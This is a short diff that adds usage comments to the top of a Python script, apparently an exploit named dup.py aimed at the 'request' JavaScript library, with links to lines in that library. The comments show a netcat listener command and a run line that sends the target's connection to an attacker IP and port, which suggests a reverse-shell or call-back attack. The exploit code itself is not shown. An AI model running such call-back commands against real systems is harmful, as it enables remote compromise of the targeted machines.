@@ -1,5 +1,8 @@
 # nc -lnvp 8000
+# python3 dup.py target attacker-nc
 # python3 dup.py 127.0.0.1 192.168.206.139:8000
+# https://github.com/request/request/blob/3c0cddc7c8eb60b470e9519da85896ed7ee0081e/request.js#L104
+# https://github.com/request/request/blob/3c0cddc7c8eb60b470e9519da85896ed7ee0081e/lib/har.js#L182
 
 import requests
 from json import loads
